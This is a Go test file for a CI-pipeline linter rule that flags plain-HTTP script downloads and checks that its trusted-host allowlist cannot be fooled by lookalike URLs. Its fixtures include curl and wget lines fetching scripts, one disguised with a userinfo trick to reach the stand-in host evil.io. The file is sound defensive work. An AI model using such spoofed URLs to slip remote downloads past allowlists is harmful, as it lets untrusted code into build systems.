package rules

import "testing"

// The allowlist hides findings, so it must match exactly what was configured
// and nothing that merely looks similar.
func TestGL016_TrustedHostMatching(t *testing.T) {
	r := &gl016{}
	r.SetTrustedHosts([]string{"nexus.example.com", "10.0.0.0/8", "fd00::/8", "10.0.0.0/33"})

	tests := []struct {
		url  string
		want bool // skipped (trusted or loopback)
	}{
		{"http://nexus.example.com/repo", true},
		{"http://NEXUS.example.com/repo", true},
		{"http://nexus.example.com:8081/repo", true},
		{"http://10.1.2.3/x", true},
		{"http://[fd00::1]/x", true},
		{"http://localhost:8080/x", true},
		{"http://127.0.0.2/x", true},
		{"http://[::1]/x", true},

		{"http://sub.nexus.example.com/x", false},     // exact names only, no subdomains
		{"http://nexus.example.com.evil.io/x", false}, // suffix lookalike
		{"http://nexus.example.com@evil.io/x", false}, // userinfo, real host is evil.io
		{"http://evil.io/#@nexus.example.com", false},
		{"http://11.0.0.1/x", false},
		{"http://[fe80::1]/x", false},
		{"http://10.0.0.1.evil.io/x", false}, // a name, not an IP in the CIDR
		{"http://%zz/x", false},              // unparsable URL
	}
	for _, tt := range tests {
		if got := r.skip(hostOf(tt.url)); got != tt.want {
			t.Errorf("skip(hostOf(%q)) = %v, want %v", tt.url, got, tt.want)
		}
	}

	// The invalid CIDR entry is ignored rather than matching everything.
	if hostInCIDR("10.1.2.3", "10.0.0.0/33") {
		t.Error("an invalid CIDR must not match")
	}
	if hostInCIDR("nexus.example.com", "10.0.0.0/8") {
		t.Error("a hostname must not match a CIDR")
	}
}

func TestGL016_TrustedHostsDoNotHideOtherHosts(t *testing.T) {
	f := findings016trusted(t, `
build:
  script:
    - curl http://nexus.example.com/a.sh -o a.sh
    - curl http://nexus.example.com@evil.io/b.sh -o b.sh
`, []string{"nexus.example.com"})
	if len(f) != 1 || f[0].Line != 5 {
		t.Fatalf("only the userinfo URL to evil.io should be flagged, got %+v", f)
	}
}

func TestGL016_HooksAndRunSteps(t *testing.T) {
	f := findings016(t, `
default:
  hooks:
    pre_get_sources_script:
      - curl http://example.com/a.sh -o a.sh
build:
  hooks:
    pre_get_sources_script:
      - wget http://example.com/b.sh
  script:
    - echo ok
steps-job:
  run:
    - name: fetch
      script: curl http://example.com/c.sh -o c.sh
`)
	lines := map[int]bool{}
	for _, x := range f {
		lines[x.Line] = true
	}
	for _, want := range []int{5, 9, 15} {
		if !lines[want] {
			t.Errorf("expected a GL016 finding on line %d, got %+v", want, f)
		}
	}
}
